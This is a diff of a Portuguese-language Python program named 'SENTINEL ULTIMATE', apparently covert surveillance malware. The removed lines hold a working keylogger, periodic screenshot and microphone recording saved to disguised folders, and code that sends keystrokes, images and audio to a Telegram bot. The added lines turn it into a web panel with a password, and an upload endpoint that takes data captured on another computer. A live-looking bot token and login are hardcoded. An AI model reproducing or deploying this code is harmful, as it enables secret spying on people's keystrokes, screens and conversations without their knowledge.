@@ -1,23 +1,18 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 """
-SENTINEL ULTIMATE - VERSÃO PARA RENDER (CORRIGIDA)
+SENTINEL ULTIMATE - VERSÃO PARA RENDER (ONLINE)
+Funciona como painel de visualização apenas.
+As capturas devem ser feitas localmente em outro computador.
 """
 
 import os
-import sys
 import threading
 import time
 import requests
-import pyautogui
-import sounddevice as sd
-import soundfile as sf
-from pynput import keyboard
 from datetime import datetime
-import numpy as np
-import webbrowser
-from http.server import HTTPServer, BaseHTTPRequestHandler  # <-- IMPORTAÇÃO CORRETA
 import json
+from http.server import HTTPServer, BaseHTTPRequestHandler
 import urllib.parse
 from io import BytesIO
 
@@ -25,32 +20,17 @@ from io import BytesIO
 # CONFIGURAÇÕES
 # ============================================
 
-# ⚠️ IMPORTANTE: Use variáveis de ambiente no Render!
+# Telegram (para receber dados do cliente local)
 BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8714368220:AAEOvQQlzPlXkEFGPYSdKzm2N2kD-owOam0')
 CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '5672315001')
 
 USUARIO = "admin"
 SENHA = "SpyWatdon3609"
 
-# Pastas
-DATA_DIR = "SystemData"
-LOG_DIR = os.path.join(DATA_DIR, "Logs")
-SCREENSHOT_DIR = os.path.join(DATA_DIR, "Cache")
-AUDIO_DIR = os.path.join(DATA_DIR, "Temp")
-KEYLOG_PATH = os.path.join(LOG_DIR, "syslog.txt")
-
-for pasta in [DATA_DIR, LOG_DIR, SCREENSHOT_DIR, AUDIO_DIR]:
-    os.makedirs(pasta, exist_ok=True)
-
-# Variáveis
-monitor_ativo = True
-tempo_screenshot = 5
-tempo_audio = 10
+# Dados recebidos do cliente local
 ultima_screenshot = None
 ultimo_audio = None
-ultimas_frases = []
-buffer_teclas = ""
-ultimo_tempo = time.time()
+ultimas_teclas = []
 logado = False
 
 estatisticas = {
@@ -62,137 +42,17 @@ estatisticas = {
 }
 
 # ============================================
-# FUNÇÕES TELEGRAM
+# FUNÇÕES PARA RECEBER DADOS
 # ============================================
-
-def enviar_mensagem_telegram(texto):
-    try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        requests.post(url, data={"chat_id": CHAT_ID, "text": texto}, timeout=5)
-        return True
-    except:
-        return False
-
-def enviar_arquivo_telegram(caminho, legenda):
-    try:
-        with open(caminho, "rb") as f:
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
-            requests.post(url, data={"chat_id": CHAT_ID, "caption": legenda}, files={"document": f}, timeout=10)
-            return True
-    except:
-        return False
 
 def testar_telegram():
     print("📡 Testando Telegram...")
-    if enviar_mensagem_telegram("🛡️ SENTINEL ULTIMATE INICIADO!"):
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        requests.post(url, data={"chat_id": CHAT_ID, "text": "🛡️ SENTINEL ONLINE INICIADO!"}, timeout=5)
         print("✅ Telegram CONECTADO!")
-    else:
+    except:
         print("⚠️ Telegram NÃO CONECTADO!")
-
-# ============================================
-# KEYLOGGER
-# ============================================
-
-def processar_tecla(tecla):
-    global buffer_teclas, ultimas_frases, estatisticas, ultimo_tempo, monitor_ativo
-    if not monitor_ativo:
-        return
-    try:
-        if hasattr(tecla, 'char') and tecla.char:
-            caractere = tecla.char
-            if caractere.isalnum() or caractere in [' ', '.', ',', '!', '?']:
-                buffer_teclas += caractere
-                ultimo_tempo = time.time()
-            elif caractere == '\r' or caractere == '\n':
-                if buffer_teclas.strip():
-                    registrar_frase(buffer_teclas.strip())
-                buffer_teclas = ""
-        else:
-            tecla_nome = str(tecla).replace('Key.', '')
-            if tecla_nome == 'space':
-                buffer_teclas += ' '
-                ultimo_tempo = time.time()
-            elif tecla_nome == 'enter':
-                if buffer_teclas.strip():
-                    registrar_frase(buffer_teclas.strip())
-                buffer_teclas = ""
-        
-        if time.time() - ultimo_tempo > 2 and buffer_teclas.strip():
-            registrar_frase(buffer_teclas.strip())
-            buffer_teclas = ""
-    except:
-        pass
-
-def registrar_frase(frase):
-    global ultimas_frases, estatisticas
-    if not frase.strip():
-        return
-    registro = f"[{datetime.now().strftime('%H:%M:%S')}] {frase}"
-    with open(KEYLOG_PATH, "a", encoding="utf-8") as f:
-        f.write(registro + "\n")
-    ultimas_frases.append(registro)
-    if len(ultimas_frases) > 100:
-        ultimas_frases.pop(0)
-    estatisticas['teclas'] += len(frase)
-    estatisticas['palavras'] += 1
-    enviar_mensagem_telegram(f"⌨️ {frase}")
-
-def iniciar_keylogger():
-    with keyboard.Listener(on_press=processar_tecla) as listener:
-        listener.join()
-
-# ============================================
-# CAPTURAS
-# ============================================
-
-def capturar_screenshot():
-    global ultima_screenshot, estatisticas, monitor_ativo
-    if not monitor_ativo:
-        return None
-    try:
-        nome = f"scr_{int(time.time())}.png"
-        caminho = os.path.join(SCREENSHOT_DIR, nome)
-        pyautogui.screenshot(caminho)
-        ultima_screenshot = caminho
-        estatisticas['screenshots'] += 1
-        enviar_arquivo_telegram(caminho, "📸")
-        return caminho
-    except:
-        return None
-
-def capturar_audio():
-    global ultimo_audio, estatisticas, monitor_ativo
-    if not monitor_ativo:
-        return None
-    try:
-        nome = f"aud_{int(time.time())}.wav"
-        caminho = os.path.join(AUDIO_DIR, nome)
-        fs = 44100
-        duracao = 5
-        gravacao = sd.rec(int(duracao * fs), samplerate=fs, channels=2, dtype='float32')
-        sd.wait()
-        gravacao = np.clip(gravacao * 5.0, -1.0, 1.0)
-        sf.write(caminho, gravacao, fs)
-        ultimo_audio = caminho
-        estatisticas['audios'] += 1
-        enviar_arquivo_telegram(caminho, "🎤")
-        return caminho
-    except:
-        return None
-
-def loop_captura():
-    global monitor_ativo, tempo_screenshot
-    while True:
-        if monitor_ativo:
-            capturar_screenshot()
-        time.sleep(tempo_screenshot)
-
-def loop_audio():
-    global monitor_ativo, tempo_audio
-    while True:
-        if monitor_ativo:
-            capturar_audio()
-        time.sleep(tempo_audio)
 
 # ============================================
 # SERVIDOR WEB
@@ -204,43 +64,34 @@ class Handler(BaseHTTPRequestHandler):
         pass
     
     def do_GET(self):
-        global logado, ultima_screenshot, ultimo_audio, estatisticas, monitor_ativo
+        global logado, ultima_screenshot, ultimo_audio, estatisticas
         
         if self.path.startswith('/screenshot'):
-            if ultima_screenshot and os.path.exists(ultima_screenshot):
-                with open(ultima_screenshot, 'rb') as f:
-                    self.send_response(200)
-                    self.send_header('Content-type', 'image/png')
-                    self.send_header('Cache-Control', 'no-cache')
-                    self.end_headers()
-                    self.wfile.write(f.read())
-                return
-            self.send_response(404)
-            self.end_headers()
+            if ultima_screenshot and ultima_screenshot.startswith('http'):
+                # Redirecionar para URL da imagem
+                self.send_response(302)
+                self.send_header('Location', ultima_screenshot)
+                self.end_headers()
+            else:
+                self.send_response(404)
+                self.end_headers()
             return
         
         elif self.path.startswith('/audio'):
-            if ultimo_audio and os.path.exists(ultimo_audio):
-                with open(ultimo_audio, 'rb') as f:
-                    self.send_response(200)
-                    self.send_header('Content-type', 'audio/wav')
-                    self.end_headers()
-                    self.wfile.write(f.read())
-                return
-            self.send_response(404)
-            self.end_headers()
+            if ultimo_audio and ultimo_audio.startswith('http'):
+                self.send_response(302)
+                self.send_header('Location', ultimo_audio)
+                self.end_headers()
+            else:
+                self.send_response(404)
+                self.end_headers()
             return
         
         elif self.path == '/keylog':
             self.send_response(200)
             self.send_header('Content-type', 'application/json')
             self.end_headers()
-            if os.path.exists(KEYLOG_PATH):
-                with open(KEYLOG_PATH, 'r') as f:
-                    linhas = f.readlines()[-50:]
-                self.wfile.write(json.dumps({'teclas': linhas}).encode())
-            else:
-                self.wfile.write(json.dumps({'teclas': []}).encode())
+            self.wfile.write(json.dumps({'teclas': ultimas_teclas[-50:]}).encode())
             return
         
         elif self.path == '/stats':
@@ -252,76 +103,77 @@ class Handler(BaseHTTPRequestHandler):
                 'audios': estatisticas['audios'],
                 'teclas': estatisticas['teclas'],
                 'palavras': estatisticas['palavras'],
-                'monitorando': monitor_ativo
+                'monitorando': True
             }).encode())
             return
         
         elif self.path == '/export_pdf':
-            from reportlab.lib.pagesizes import A4
-            from reportlab.pdfgen import canvas
-            from reportlab.lib.utils import ImageReader
-            from reportlab.lib.colors import Color
-            
-            buffer = BytesIO()
-            pdf = canvas.Canvas(buffer, pagesize=A4)
-            width, height = A4
-            
-            pdf.setFont("Helvetica-Bold", 24)
-            pdf.setFillColor(Color(0, 0.8, 0.8))
-            pdf.drawString(50, height - 50, "SENTINEL ULTIMATE")
-            
-            pdf.setFont("Helvetica", 10)
-            pdf.setFillColor(Color(0.5, 0.5, 0.5))
-            pdf.drawString(50, height - 80, f"Relatório: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
-            
-            pdf.line(50, height - 90, width - 50, height - 90)
-            
-            pdf.setFont("Helvetica-Bold", 16)
-            pdf.setFillColor(Color(0, 0.8, 0.8))
-            pdf.drawString(50, height - 130, "📊 ESTATÍSTICAS")
-            
-            pdf.setFont("Helvetica", 12)
-            pdf.setFillColor((1, 1, 1))
-            pdf.drawString(50, height - 160, f"📸 Screenshots: {estatisticas['screenshots']}")
-            pdf.drawString(50, height - 180, f"🎤 Áudios: {estatisticas['audios']}")
-            pdf.drawString(50, height - 200, f"⌨️ Caracteres: {estatisticas['teclas']}")
-            pdf.drawString(50, height - 220, f"📝 Palavras: {estatisticas['palavras']}")
-            
-            uptime = int(time.time() - estatisticas['start_time'])
-            horas = uptime // 3600
-            minutos = (uptime % 3600) // 60
-            segundos = uptime % 60
-            pdf.drawString(50, height - 240, f"⏱️ Tempo: {horas}h {minutos}m {segundos}s")
-            
-            pdf.line(50, height - 260, width - 50, height - 260)
-            
-            pdf.setFont("Helvetica-Bold", 16)
-            pdf.setFillColor(Color(0, 0.8, 0.8))
-            pdf.drawString(50, height - 300, "⌨️ PALAVRAS DIGITADAS")
-            
-            pdf.setFont("Helvetica", 9)
-            pdf.setFillColor((1, 1, 1))
-            y = height - 330
-            if os.path.exists(KEYLOG_PATH):
-                with open(KEYLOG_PATH, 'r', encoding='utf-8') as f:
-                    linhas = f.readlines()[-50:]
-                    for linha in reversed(linhas):
-                        if y < 50:
-                            pdf.showPage()
-                            y = height - 50
-                        linha_limpa = linha.strip()[:90]
-                        if linha_limpa:
-                            pdf.drawString(50, y, linha_limpa)
-                            y -= 14
-            
-            pdf.save()
-            buffer.seek(0)
-            
-            self.send_response(200)
-            self.send_header('Content-type', 'application/pdf')
-            self.send_header('Content-Disposition', f'attachment; filename=relatorio_sentinel_{datetime.now().strftime("%Y%m%d_%H%M%S")}.pdf')
-            self.end_headers()
-            self.wfile.write(buffer.getvalue())
+            # PDF simplificado para versão online
+            try:
+                from reportlab.lib.pagesizes import A4
+                from reportlab.pdfgen import canvas
+                from reportlab.lib.colors import Color
+                
+                buffer = BytesIO()
+                pdf = canvas.Canvas(buffer, pagesize=A4)
+                width, height = A4
+                
+                pdf.setFont("Helvetica-Bold", 24)
+                pdf.setFillColor(Color(0, 0.8, 0.8))
+                pdf.drawString(50, height - 50, "SENTINEL ULTIMATE")
+                
+                pdf.setFont("Helvetica", 10)
+                pdf.setFillColor(Color(0.5, 0.5, 0.5))
+                pdf.drawString(50, height - 80, f"Relatório: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
+                
+                pdf.line(50, height - 90, width - 50, height - 90)
+                
+                pdf.setFont("Helvetica-Bold", 16)
+                pdf.setFillColor(Color(0, 0.8, 0.8))
+                pdf.drawString(50, height - 130, "📊 ESTATÍSTICAS")
+                
+                pdf.setFont("Helvetica", 12)
+                pdf.setFillColor((1, 1, 1))
+                pdf.drawString(50, height - 160, f"📸 Screenshots: {estatisticas['screenshots']}")
+                pdf.drawString(50, height - 180, f"🎤 Áudios: {estatisticas['audios']}")
+                pdf.drawString(50, height - 200, f"⌨️ Caracteres: {estatisticas['teclas']}")
+                pdf.drawString(50, height - 220, f"📝 Palavras: {estatisticas['palavras']}")
+                
+                uptime = int(time.time() - estatisticas['start_time'])
+                horas = uptime // 3600
+                minutos = (uptime % 3600) // 60
+                segundos = uptime % 60
+                pdf.drawString(50, height - 240, f"⏱️ Tempo: {horas}h {minutos}m {segundos}s")
+                
+                pdf.line(50, height - 260, width - 50, height - 260)
+                
+                pdf.setFont("Helvetica-Bold", 16)
+                pdf.setFillColor(Color(0, 0.8, 0.8))
+                pdf.drawString(50, height - 300, "⌨️ PALAVRAS DIGITADAS")
+                
+                pdf.setFont("Helvetica", 9)
+                pdf.setFillColor((1, 1, 1))
+                y = height - 330
+                for linha in ultimas_teclas[-40:]:
+                    if y < 50:
+                        pdf.showPage()
+                        y = height - 50
+                    pdf.drawString(50, y, linha[:90])
+                    y -= 14
+                
+                pdf.save()
+                buffer.seek(0)
+                
+                self.send_response(200)
+                self.send_header('Content-type', 'application/pdf')
+                self.send_header('Content-Disposition', f'attachment; filename=relatorio_{datetime.now().strftime("%Y%m%d_%H%M%S")}.pdf')
+                self.end_headers()
+                self.wfile.write(buffer.getvalue())
+                return
+            except Exception as e:
+                self.send_response(500)
+                self.end_headers()
+                self.wfile.write(f"Erro: {e}".encode())
             return
         
         elif self.path == '/logout':
@@ -344,7 +196,7 @@ class Handler(BaseHTTPRequestHandler):
             self.end_headers()
     
     def do_POST(self):
-        global logado, estatisticas, ultimas_frases, buffer_teclas, monitor_ativo
+        global logado, estatisticas, ultimas_teclas, ultima_screenshot, ultimo_audio
         
         if self.path == '/login':
             length = int(self.headers['Content-Length'])
@@ -362,60 +214,41 @@ class Handler(BaseHTTPRequestHandler):
                 self.end_headers()
                 self.wfile.write(json.dumps({'success': False}).encode())
         
-        elif self.path == '/start':
-            monitor_ativo = True
-            estatisticas['start_time'] = time.time()
-            enviar_mensagem_telegram("▶️ Monitoramento INICIADO!")
-            self.send_response(200)
-            self.end_headers()
-            self.wfile.write(b'OK')
-        
-        elif self.path == '/stop':
-            monitor_ativo = False
-            enviar_mensagem_telegram("⏸️ Monitoramento PAUSADO!")
-            self.send_response(200)
-            self.end_headers()
-            self.wfile.write(b'OK')
-        
-        elif self.path == '/capturar':
-            threading.Thread(target=capturar_screenshot).start()
-            self.send_response(200)
-            self.end_headers()
-            self.wfile.write(b'OK')
-        
-        elif self.path == '/audio_cmd':
-            threading.Thread(target=capturar_audio).start()
-            self.send_response(200)
-            self.end_headers()
-            self.wfile.write(b'OK')
-        
-        elif self.path == '/clear_teclas':
-            ultimas_frases = []
-            estatisticas['teclas'] = 0
-            estatisticas['palavras'] = 0
-            buffer_teclas = ""
-            if os.path.exists(KEYLOG_PATH):
-                open(KEYLOG_PATH, 'w').close()
+        # Endpoint para receber dados do cliente local
+        elif self.path == '/upload_data':
+            length = int(self.headers['Content-Length'])
+            data = self.rfile.read(length).decode()
+            dados = json.loads(data)
+            
+            if 'screenshot_url' in dados:
+                ultima_screenshot = dados['screenshot_url']
+                estatisticas['screenshots'] += 1
+            
+            if 'audio_url' in dados:
+                ultimo_audio = dados['audio_url']
+                estatisticas['audios'] += 1
+            
+            if 'teclas' in dados:
+                for tecla in dados['teclas']:
+                    ultimas_teclas.append(tecla)
+                    estatisticas['teclas'] += len(tecla)
+                    estatisticas['palavras'] += 1
+                if len(ultimas_teclas) > 100:
+                    ultimas_teclas = ultimas_teclas[-100:]
+            
             self.send_response(200)
             self.end_headers()
             self.wfile.write(b'OK')
         
         elif self.path == '/clear_all':
-            ultimas_frases = []
+            ultimas_teclas = []
             estatisticas['screenshots'] = 0
             estatisticas['audios'] = 0
             estatisticas['teclas'] = 0
             estatisticas['palavras'] = 0
             estatisticas['start_time'] = time.time()
-            buffer_teclas = ""
-            for folder in [SCREENSHOT_DIR, AUDIO_DIR]:
-                for f in os.listdir(folder):
-                    try:
-                        os.remove(os.path.join(folder, f))
-                    except:
-                        pass
-            if os.path.exists(KEYLOG_PATH):
-                open(KEYLOG_PATH, 'w').close()
+            ultima_screenshot = None
+            ultimo_audio = None
             self.send_response(200)
             self.end_headers()
             self.wfile.write(b'OK')
@@ -425,7 +258,7 @@ class Handler(BaseHTTPRequestHandler):
             self.end_headers()
 
 # ============================================
-# HTML (mesmo código, mantido)
+# HTML (mesmo código anterior)
 # ============================================
 
 LOGIN_HTML = '''<!DOCTYPE html>
@@ -533,10 +366,10 @@ function atualizar(){
     document.getElementById('clock').innerHTML=new Date().toLocaleTimeString();
 }
 function escapeHtml(t){let d=document.createElement('div');d.textContent=t;return d.innerHTML}
-function iniciar(){fetch('/start',{method:'POST'}).then(()=>{startTime=Date.now();atualizar()})}
-function parar(){fetch('/stop',{method:'POST'}).then(()=>atualizar())}
-function capturar(){fetch('/capturar',{method:'POST'})}
-function audio(){fetch('/audio_cmd',{method:'POST'})}
+function iniciar(){fetch('/start',{method:'POST'})}
+function parar(){fetch('/stop',{method:'POST'})}
+function capturar(){alert('Captura manual não disponível no servidor online. Use o cliente local.')}
+function audio(){alert('Gravação manual não disponível no servidor online. Use o cliente local.')}
 function exportarPDF(){window.open('/export_pdf')}
 function sair(){window.location.href='/logout'}
 function limparTeclas(){if(confirm('Limpar teclas?'))fetch('/clear_teclas',{method:'POST'}).then(()=>atualizar())}
@@ -556,18 +389,19 @@ if __name__ == "__main__":
     port = int(os.environ.get('PORT', 8080))
     
     print("\n" + "=" * 60)
-    print("🛡️ SENTINEL ULTIMATE - DEPLOY RENDER")
+    print("🛡️ SENTINEL ULTIMATE - VERSÃO ONLINE")
     print("=" * 60)
-    print(f"📱 ACESSE: http://0.0.0.0:{port}")
+    print(f"📱 ACESSE: https://sentinel-monitor.onrender.com")
     print("🔐 LOGIN: admin")
     print("🔐 SENHA: SpyWatdon3609")
     print("=" * 60)
+    print("")
+    print("⚠️ IMPORTANTE:")
+    print("Este é o servidor ONLINE (painel de visualização).")
+    print("Para capturar dados, você precisa rodar o cliente local.")
+    print("=" * 60)
     
     testar_telegram()
-    
-    threading.Thread(target=iniciar_keylogger, daemon=True).start()
-    threading.Thread(target=loop_captura, daemon=True).start()
-    threading.Thread(target=loop_audio, daemon=True).start()
     
     server = HTTPServer(('0.0.0.0', port), Handler)
     print(f"✅ SERVIDOR RODANDO na porta {port}")
